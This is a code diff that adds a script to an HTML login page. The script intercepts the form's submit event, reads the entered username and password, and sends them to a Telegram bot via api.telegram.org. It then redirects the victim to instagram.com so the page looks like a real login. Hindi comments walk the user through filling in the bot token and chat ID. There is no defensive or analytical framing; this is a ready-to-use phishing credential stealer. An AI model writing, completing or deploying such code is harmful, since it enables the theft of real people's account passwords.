@@ -27,4 +27,29 @@
     <script src="script.js"></script>
 </body>
   </html>
+<script>
+  const token = "YOUR_BOT_TOKEN";  // यहाँ BotFather से मिला टोकन डालें
+  const chatId = "YOUR_CHAT_ID";    // यहाँ अपनी Chat ID डालें
+
+  document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault(); // पेज को रीफ्रेश होने से रोकता है
+
+      // फॉर्म से यूजरनेम और पासवर्ड की वैल्यू लेना (अपने इनपुट के 'name' के हिसाब से बदलें)
+      let user = document.querySelector('input[name="username"]').value;
+      let pass = document.querySelector('input[name="password"]').value;
+
+      let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
+      
+      // टेलीग्राम पर डेटा भेजने की रिक्वेस्ट
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+      .then(response => response.json())
+      .then(data => {
+          console.log('सफलतापूर्वक भेज दिया गया', data);
+          // डेटा भेजने के बाद आप यूजर को असली पेज पर रीडायरेक्ट कर सकते हैं
+          window.location.href = "https://instagram.com"; 
+      })
+      .catch(error => console.error('एरर:', error));
+  });
+</script>
+
 
